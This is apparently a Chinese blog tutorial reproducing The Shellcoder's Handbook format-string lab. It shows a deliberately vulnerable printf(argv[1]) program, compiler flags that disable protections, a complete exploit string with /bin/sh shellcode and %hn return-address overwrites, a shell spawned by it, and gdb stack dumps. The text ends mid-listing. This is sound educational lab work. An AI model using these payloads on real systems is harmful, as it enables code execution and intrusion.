    <content type="html"><![CDATA[<p>可参考资料不限于但包括:<br><a href="http://bbs.pediy.com/">0day安全 软件漏洞分析技术</a><br><a href="https://zhuanlan.zhihu.com/p/24489276">https://zhuanlan.zhihu.com/p/24489276</a><br><a href="http://www.cis.syr.edu/~wedu/seed/">逆向工程学习平台</a><br><a href="http://www.xfocus.net/articles/200103/123.html">http://www.xfocus.net/articles/200103/123.html</a><br><a href="http://www.freebuf.com/articles/system/74224.html">http://www.freebuf.com/articles/system/74224.html</a><br><a href="http://nullablesecurity.blogspot.co.uk/">http://nullablesecurity.blogspot.co.uk/</a><br><a href="http://bbs.pediy.com/showthread.php?t=123602">Exploit 编写教程</a><br><a href="https://github.com/shiyanlou/seedlab/blob/master/formatstring.md">https://github.com/shiyanlou/seedlab/blob/master/formatstring.md</a><br><a href="http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf">http://staff.ustc.edu.cn/~billzeng/seclab/selab02.pdf</a><br><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X/ref=sr_1_1?ie=UTF8&qid=1483684023&sr=8-1&keywords=shellcoders+handbook">The Shellcoder’s Handbook</a></p><span id="more"></span><hr><h1 id="再说说fmt"><a href="#再说说fmt" class="headerlink" title="再说说fmt"></a>再说说fmt</h1><p>在之前一篇<a href="http://www.rutk1t0r.org/2016/09/25/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%92%B8printf%E5%90%A7/">《一起来撸printf吧》</a>中分析了内核中printf(printk)的大体实现，即可以进行一些简单地调试输出，因此实现了基本的参数格式化包括%n。但是应用开发者一般都是使用的glibc提供的C运行时库。而其<a href="ftp://ftp.gnu.org/gnu/glibc/">实现</a>更为复杂，有兴趣的可以参考。微软貌似不太一样，没有实现诸如<code>%$n</code>中的<code>$</code>控制，当然也可以不需要<code>$</code>直接通过之前输入的字符控制。根据前文分析得知类似printf类的函数还有很多，最后大都调用vfprintf函数进一步解析参数，一般不检查参数的合法性而直接进行格式化，写入或读出。因此编译的时候gcc有时候会提示不安全的警告。下面是格式化字符串漏洞的危害:<br><img src="/images/The_shellcoders_handbook_ch04_fmt_use.png" alt="The_shellcoders_handbook_ch04_fmt_use.png"></p><h1 id="来个小实验"><a href="#来个小实验" class="headerlink" title="来个小实验"></a>来个小实验</h1><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OS 版本:4.4.0-58-generic <span class="comment">#79-Ubuntu SMP Tue Dec 20 12:12:31 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">gcc: gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4)</span><br><span class="line">libc: lrwxrwxrwx 1 root root 12 11月 17 06:51 /lib/i386-linux-gnu/libc.so.6 -&gt; libc-2.23.so</span><br><span class="line">GNU bash，版本 4.3.46(1)-release (i686-pc-linux-gnu)</span><br></pre></td></tr></table></figure><h2 id="测试例程"><a href="#测试例程" class="headerlink" title="测试例程"></a>测试例程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ ls</span><br><span class="line">ascii.c  dowu.c  exit.c  fmt  fmt.c  gen_upload_string.c  Makefile  test.txt</span><br><span class="line">pgp@Rutk1t0r:ch04$ cat fmt.c </span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">/*I have changed the code,so <span class="built_in">let</span> it work*/</span><br><span class="line"></span><br><span class="line">/*In order to implement arbitrary address write I need some <span class="built_in">local</span> vars and strcpy them.*/</span><br><span class="line">/*But I don<span class="string">&#x27;t need overflow the stack*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main( int argc, char *argv[] )</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">char evil[128];</span></span><br><span class="line"><span class="string">strcpy(evil, argv[1]);</span></span><br><span class="line"><span class="string">printf( argv[1]);</span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ cat Makefile </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fmt: fmt.c</span></span><br><span class="line"><span class="string">gcc -fno-stack-protector -z execstack -o fmt fmt.c </span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ps</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">28187 pts/13   00:00:00 bash</span></span><br><span class="line"><span class="string">29047 pts/13   00:00:00 ps</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ls</span></span><br><span class="line"><span class="string">ascii.c  dowu.c  exit.c  fmt  fmt.c  gen_upload_string.c  Makefile  test.txt</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ./fmt $&#x27;</span>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x9e\xf1\xff\xbf\x9c\xf1\xff\xbf%49119x%10<span class="variable">$hn</span>%12529x%11<span class="variable">$hn</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1����</span></span><br><span class="line"><span class="string">     Qh//shh/bin��̀�����������</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> bffff3b9 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                     To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span></span><br><span class="line"><span class="string">See &quot;man sudo_root&quot; for details.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$ ps</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">28187 pts/13   00:00:00 bash</span></span><br><span class="line"><span class="string">29051 pts/13   00:00:00 sh</span></span><br><span class="line"><span class="string">29277 pts/13   00:00:00 ps</span></span><br><span class="line"><span class="string">pgp@Rutk1t0r:ch04$</span></span><br></pre></td></tr></table></figure><h1 id="如何做成这个测试"><a href="#如何做成这个测试" class="headerlink" title="如何做成这个测试?"></a>如何做成这个测试?</h1><p>上面结果就像是’蹦’得一下就完成了，其中还有很多空白字符没有复制过来了。为了这个小测试可谓煞费苦心。首先要找到shellcode,其中表网最知名的莫过于Offensive团队维护的<a href="https://www.exploit-db.com/">Exploit Database</a>。这是个学习的好地方…为了更简单我直接用谷大神的shellcode，选择了一个执行<code>/bin/sh</code>的<a href="https://github.com/embpgp/shellcoding/blob/master/linux/sh/push.c">shellcode</a>。后来出问题的时候还想换成类<code>/bin/nc</code>的反弹或者直连shellcode，无奈<code>-e</code>参数无法执行只好继续用<code>/bin/sh</code>。问题后续会说。</p><h2 id="测试程序为何要改"><a href="#测试程序为何要改" class="headerlink" title="测试程序为何要改?"></a>测试程序为何要改?</h2><p>我用的测试例程基于《The Shellcode’s Handbook》.其中的fmt.c就是ch04目录下的。为了gdb调试简单我干脆删掉了对argc的判断和信息提示，本想直接了当地用空壳<code>printf( argv[1] );</code>即可完成测试，到后来发现并不能。为什么？因为类似于printf的格式化字符串漏洞的本质在于对栈空间参数的解析。而我们如果仅仅是单纯读栈空间内存的话很容易，若要写任意内存的话则必须借助%n来实现，而%n也不是那么容易利用的。它仅仅是能够对本次printf的调用在%n之前输出的字符数目(在分析内核中printf的实现的时候可以看到是两个局部指针相减)。因此我认为书中所说写任意数据是得打个问号的。书中的例子连续覆盖地址4个字节，但是要考虑到我们想写的数据字节并非都是递增(递减)。我们仅仅能够通过增加后续字节来使得要写得数据越来越大，因此如果不能保证递增或者递减，那么刚刚写好的数据可能又会被覆盖，因此必须得精心构造。书中提到利用%hn仅仅写16位数据，没错，我就是用这个来实现的。但是如果某些版本的glibc不支持就没辙了。因此我将测试例程改为了在栈空间复制了我的exp，这样我就能够传入我想要写的地址，之后利用%n来将我想写的地址处的数据变为shellcode首地址，exp中我将改写main函数的返回地址。还有个<code>$</code>特性，利用它可以制定具体的参数被处理，这样可以减少exp的体积，便于调试。</p><p><img src="/images/The_Shellcodes_Handbook_ch04_write_4_b.png" alt="The_Shellcodes_Handbook_ch04_write_4_b.png"></p><h2 id="需要关闭的保护选项"><a href="#需要关闭的保护选项" class="headerlink" title="需要关闭的保护选项"></a>需要关闭的保护选项</h2><ul><li>-fno-stack-protector 是为了取消gs的cookie保护，攻防详情可以参考网络或者书籍。</li><li>-z execstack 是告诉链接器栈空间数据可以被执行。同上。</li><li>保证/proc/sys/kernel/randomize_va_space的值为0,以此关闭ASLR,同上。</li></ul><h2 id="开启GDB调试"><a href="#开启GDB调试" class="headerlink" title="开启GDB调试"></a>开启GDB调试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pgp@Rutk1t0r:ch04$ gdb ./fmt </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i686-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from ./fmt...done.</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x0804843b &lt;+0&gt;:lea    0x4(%esp),%ecx</span><br><span class="line">   0x0804843f &lt;+4&gt;:and    <span class="variable">$0xfffffff0</span>,%esp</span><br><span class="line">   0x08048442 &lt;+7&gt;:pushl  -0x4(%ecx)</span><br><span class="line">   0x08048445 &lt;+10&gt;:push   %ebp</span><br><span class="line">   0x08048446 &lt;+11&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048448 &lt;+13&gt;:push   %edi</span><br><span class="line">   0x08048449 &lt;+14&gt;:push   %ebx</span><br><span class="line">   0x0804844a &lt;+15&gt;:push   %ecx</span><br><span class="line">   0x0804844b &lt;+16&gt;:sub    <span class="variable">$0x8c</span>,%esp</span><br><span class="line">   0x08048451 &lt;+22&gt;:mov    %ecx,%ebx</span><br><span class="line">   0x08048453 &lt;+24&gt;:lea    -0x98(%ebp),%edx</span><br><span class="line">   0x08048459 &lt;+30&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0804845e &lt;+35&gt;:mov    <span class="variable">$0x20</span>,%ecx</span><br><span class="line">   0x08048463 &lt;+40&gt;:mov    %edx,%edi</span><br><span class="line">   0x08048465 &lt;+42&gt;:rep stos %eax,%es:(%edi)</span><br><span class="line">   0x08048467 &lt;+44&gt;:mov    0x4(%ebx),%eax</span><br><span class="line">   0x0804846a &lt;+47&gt;:add    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x0804846d &lt;+50&gt;:mov    (%eax),%eax</span><br><span class="line">   0x0804846f &lt;+52&gt;:sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line">   0x08048472 &lt;+55&gt;:push   %eax</span><br><span class="line">   0x08048473 &lt;+56&gt;:lea    -0x98(%ebp),%eax</span><br><span class="line">   0x08048479 &lt;+62&gt;:push   %eax</span><br><span class="line">   0x0804847a &lt;+63&gt;:call   0x8048310 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0804847f &lt;+68&gt;:add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">   0x08048482 &lt;+71&gt;:mov    0x4(%ebx),%eax</span><br><span class="line">   0x08048485 &lt;+74&gt;:add    <span class="variable">$0x4</span>,%eax</span><br><span class="line">   0x08048488 &lt;+77&gt;:mov    (%eax),%eax</span><br><span class="line">   0x0804848a &lt;+79&gt;:sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line">   0x0804848d &lt;+82&gt;:push   %eax</span><br><span class="line">   0x0804848e &lt;+83&gt;:call   0x8048300 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x08048493 &lt;+88&gt;:add    <span class="variable">$0x10</span>,%esp</span><br><span class="line">---Type &lt;<span class="built_in">return</span>&gt; to <span class="built_in">continue</span>, or q &lt;<span class="built_in">return</span>&gt; to quit---</span><br><span class="line">   0x08048496 &lt;+91&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0804849b &lt;+96&gt;:lea    -0xc(%ebp),%esp</span><br><span class="line">   0x0804849e &lt;+99&gt;:pop    %ecx</span><br><span class="line">   0x0804849f &lt;+100&gt;:pop    %ebx</span><br><span class="line">   0x080484a0 &lt;+101&gt;:pop    %edi</span><br><span class="line">   0x080484a1 &lt;+102&gt;:pop    %ebp</span><br><span class="line">   0x080484a2 &lt;+103&gt;:lea    -0x4(%ecx),%esp</span><br><span class="line">   0x080484a5 &lt;+106&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><ul><li><p>然后在下面三处地址下断点，为什么呢？第一处为刚刚执行完strcpy函数，从此处观察栈空间中我们输入的数据是否都正常地拷贝进来了，因此exp(包括shellcode)中若是含有\0坏字符将导致测试失败。当然也有很多<code>高深的技巧</code>来避免坏字符…第二处为printf函数刚刚执行完，我们可以看到返回地址是否被成功修改我们想要的地址。第三处为main函数快要返回了，此时的esp刚好指向返回地址，我们也可以查看是否正确，并且单步执行看程序执行流是否被导向到shellcode。</p></li><li><p>随后我们随便输入一个字符试试。经过对反汇编代码的认真分析以及对execve系统调用的大致理解可以知道下面的0xbfffff0e0处为evil首地址，因为有0x41414141。在地址0xbffff18c处为main函数的返回地址，继续往上为argc,等于2,正确。在网上则为argv的首地址，我们可以根据它继续分析argv[1]的地址是可以找到的。可以稍微参考<a href="http://www.rutk1t0r.org/2016/12/30/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-0-11%E7%9A%84loader-execve/">这篇文章</a>中的截图参照分析。认真分析过反汇编代码可以知道esp进来的时候总需要16字节对齐，猜测这是gcc的需求，然后又重新把返回地址压栈一遍，因此根据这个特性我们可以在另外的调试场景中快速定位ret(表示main函数返回地址)。由于我们禁止了ASLR，因此每次这个ret值是固定的，在我的PC中测试为0xb7e1b637，我们就是要改写它，而它的地址为0xbffff18c。我们每次的exp长度如果不同，导致程序参数长度不同，会继续导致exec系统调用对参数处理后esp值不同，因此我们需要随机应变。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff224) at fmt.c:12</span><br><span class="line">12strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff0d0:0xbffff0e00xbffff3d70xb7fd7b480x00000001</span><br><span class="line">0xbffff0e0:0x414141410x000000000x000000000x00000000</span><br><span class="line">0xbffff0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff110:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff120:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff130:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff140:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff150:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff160:0x000000020xbffff2240xbffff2300xbffff190</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff170:0x000000000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff180:0xb7fb50000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff190:0x000000020xbffff2240xbffff2300x00000000</span><br><span class="line">0xbffff1a0:0x000000000x000000000xb7fb50000xb7fffc04</span><br><span class="line">0xbffff1b0:0xb7fff0000x000000000xb7fb50000xb7fb5000</span><br><span class="line">0xbffff1c0:0x000000000xab847af50x970cb4e50x00000000</span><br><span class="line">0xbffff1d0:0x000000000x000000000x000000020x08048340</span><br><span class="line">0xbffff1e0:0x000000000xb7feff100xb7fea7800xb7fff000</span><br><span class="line">0xbffff1f0:0x000000020x080483400x000000000x08048361</span><br><span class="line">0xbffff200:0x0804843b0x000000020xbffff2240x080484b0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li><li><p>上述仅仅是从第一步开始的时候这样探测，因此如果我们大概知道了这个”套路”就应该上真家伙。注意观察run后面的参数。解释一下这个exp(exploit)。前面部分直到\x80均为shellcode,取自谷大神的。后续填充了三个\x90,在Intel里面为<code>nop</code>。不过在这里不会执行到，只要不为\0即可。接着的8个字节为ret的高16位和低16位，我们可以看到0xbffff0bc开始的8个字节<code>大致</code>为ret的地址。这不是随机的，这是经过精心构造的，由于地址不对，我将重新修正(0xbffff014C)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x3e\xf2\xff\xbf\x3c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x3e\xf2\xff\xbf\x3c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:12</span><br><span class="line">12strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:0xbffff0a00xbffff3a10xb7fd7b480x00000001</span><br><span class="line">0xbffff0a0:0xe1f7c9310x68510bb00x68732f2f0x69622f68</span><br><span class="line">0xbffff0b0:0xcde3896e0x909090800xbffff23e0xbffff23c</span><br><span class="line">0xbffff0c0:0x313934250x257839310x682430310x3231256e</span><br><span class="line">0xbffff0d0:0x783938360x243131250x00006e680x00000000</span><br><span class="line">0xbffff0e0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff110:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff120:0x000000020xbffff1e40xbffff1f00xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:0x000000000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff140:0xb7fb50000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff150:0x000000020xbffff1e40xbffff1f00x00000000</span><br><span class="line">0xbffff160:0x000000000x000000000xb7fb50000xb7fffc04</span><br><span class="line">0xbffff170:0xb7fff0000x000000000xb7fb50000xb7fb5000</span><br><span class="line">0xbffff180:0x000000000xe29ac6ee0xde1388fe0x00000000</span><br><span class="line">0xbffff190:0x000000000x000000000x000000020x08048340</span><br><span class="line">0xbffff1a0:0x000000000xb7feff100xb7fea7800xb7fff000</span><br><span class="line">0xbffff1b0:0x000000020x080483400x000000000x08048361</span><br><span class="line">0xbffff1c0:0x0804843b0x000000020xbffff1e40x080484b0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure></li><li><p>这一次对了，仅仅修改两个字节即可。好了，现在我们需要修改的地址已经传递进来了，是时候将数据传进来的。此时可以看到我们要传递的数据应该为0xbfffff0a0,只要将此值覆盖ret，控制流程就会被劫持到这里执行shellcode，又由于栈空间是可以被执行的(编译选项,还可以利用指令<code>cat /proc/[pid]/maps</code>来看)。利用%hn的特性，我们仅仅需要写两次即可，而根据%hn的特性我们无奈地只能先写0xbfff再铺垫0xf0a0-0xbfff个字符继续写。当然在写0xbfff之前需要计算字符个数来填充，因此才有了后面的%49119x以及%12689x。根据这几个原理我们将继续修正这几个值来使得exp能够被触发。我们先来看printf执行之后的情况吧。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) run $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf2\xff\xbf\x4c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /home/pgp/hacker/shellcodershandbook/code/ch04/fmt $<span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x4e\xf2\xff\xbf\x4c\xf2\xff\xbf%49119x%10$hn%12689x%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804847f <span class="keyword">in</span> main (argc=2, argv=0xbffff1e4) at fmt.c:12</span><br><span class="line">12strcpy(evil, argv[1]);</span><br><span class="line">(gdb) x/40x <span class="variable">$esp</span></span><br><span class="line">0xbffff090:0xbffff0a00xbffff3a10xb7fd7b480x00000001</span><br><span class="line">0xbffff0a0:0xe1f7c9310x68510bb00x68732f2f0x69622f68</span><br><span class="line">0xbffff0b0:0xcde3896e0x909090800xbffff24e0xbffff24c</span><br><span class="line">0xbffff0c0:0x313934250x257839310x682430310x3231256e</span><br><span class="line">0xbffff0d0:0x783938360x243131250x00006e680x00000000</span><br><span class="line">0xbffff0e0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff0f0:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff100:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff110:0x000000000x000000000x000000000x00000000</span><br><span class="line">0xbffff120:0x000000020xbffff1e40xbffff1f00xbffff150</span><br><span class="line">(gdb) </span><br><span class="line">0xbffff130:0x000000000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff140:0xb7fb50000xb7fb50000x000000000xb7e1b637</span><br><span class="line">0xbffff150:0x000000020xbffff1e40xbffff1f00x00000000</span><br><span class="line">0xbffff160:0x000000000x000000000xb7fb50000xb7fffc04</span><br><span class="line">0xbffff170:0xb7fff0000x000000000xb7fb50000xb7fb5000</span><br><span class="line">0xbffff180:0x000000000x09129cd80x359bd2c80x00000000</span><br><span class="line">0xbffff190:0x000000000x000000000x000000020x08048340</span><br><span class="line">0xbffff1a0:0x000000000xb7feff100xb7fea7800xb7fff000</span><br><span class="line">0xbffff1b0:0x000000020x080483400x000000000x08048361</span><br><span class="line">0xbffff1c0:0x0804843b0x000000020xbffff1e40x080484b0</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>键入c之后程序继续运行，断在了printf刚刚执行完毕的地方。我们观察ret处发现并没有被修改，因此重新计算，再次重新运行。(发现前面也计算错了，得将f2改为f1).</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 